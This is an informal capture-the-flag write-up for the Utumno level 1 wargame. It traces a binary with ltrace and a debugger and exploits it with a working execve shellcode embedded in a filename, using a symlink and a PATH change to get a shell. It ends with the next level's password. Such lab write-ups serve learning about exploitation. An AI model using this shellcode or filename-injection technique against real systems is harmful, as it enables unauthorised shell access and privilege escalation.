upon running, nothing happens... we add an argument and use ltrace:  
we see opendir("a")  
so we make a file: /tmp/utm1/test  
again: we now see strcmp("sh_", "test")  
so we change the name to "sh_"...  
now we get SEGSIV - segmentation fault...  
we analyze main and see that the code iterates through the directory, and if strcmp if true, we start run()  
analyzing run, it swaps registers (unclear) - but its the cause to the jump in code - so using breakpoints we find out the code jumps to:  
0x804a062 -> the address just after "sh_", so we try to put the shellcode after sh_, but we get:  
cant touch '----' no such file or directory... we must remove /bin/sh...  
using dynamic link: ln -s /bin/sh sssh  
at last:  
touch $(python -c 'print "/tmp/utm1/sh_" + "\x31\xc0\x50\x68sssh\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')  
PATH=.:$PATH  
/utumno/utumno1 /tmp/utm1/  



password:  
ceewaceiph
